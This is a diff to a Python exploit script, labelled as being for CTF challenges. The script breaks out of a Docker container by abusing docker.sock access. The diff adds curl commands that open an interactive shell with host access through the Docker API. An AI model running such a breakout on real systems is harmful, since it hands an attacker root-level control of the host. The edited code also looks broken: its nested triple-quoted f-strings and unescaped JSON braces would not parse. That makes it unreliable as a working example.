@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Docker Container Breakout Exploit for Docker Group Members
+Docker Container Breakout Exploit using Docker Group Membership
 For CTF challenges - Educational purposes only
 """
 
@@ -113,7 +113,7 @@ def create_docker_socket_client():
     
     script_path = "/tmp/docker_client.py"
     with open(script_path, "w") as f:
-        f.write("""#!/usr/bin/env python3
+        f.write('''#!/usr/bin/env python3
 import socket
 import json
 import sys
@@ -288,9 +288,11 @@ def breakout_via_socket(sock_path):
         # Get shell
         print("[*] Getting interactive shell with host access...")
         print("[*] Use the following command to open a shell:")
-        print(f"    curl -s --unix-socket {sock_path} -X POST -H 'Content-Type: application/json' -d '{{\\"AttachStdin\\":true,\\"AttachStdout\\":true,\\"AttachStderr\\":true,\\"Tty\\":true,\\"Cmd\\":[\\"sh\\"]}}' http://localhost/v1.41/containers/{container_id}/exec | json_pp")
+        cmd1 = f'''curl -s --unix-socket {sock_path} -X POST -H "Content-Type: application/json" -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh"]}' http://localhost/v1.41/containers/{container_id}/exec | json_pp'''
+        print(f"    {cmd1}")
         print(f"    # Then get the exec ID and run:")
-        print(f"    curl -s --unix-socket {sock_path} -X POST -H 'Content-Type: application/json' -d '{{\\"Detach\\":false,\\"Tty\\":true}}' http://localhost/v1.41/exec/EXEC_ID/start")
+        cmd2 = f'''curl -s --unix-socket {sock_path} -X POST -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}' http://localhost/v1.41/exec/EXEC_ID/start'''
+        print(f"    {cmd2}")
         
         return True
     else:
@@ -304,7 +306,7 @@ if __name__ == "__main__":
         sock_path = "/var/run/docker.sock"
     
     breakout_via_socket(sock_path)
-""")
+''')
     
     os.chmod(script_path, 0o755)
     print(f"[+] Created Docker socket client script at: {script_path}")
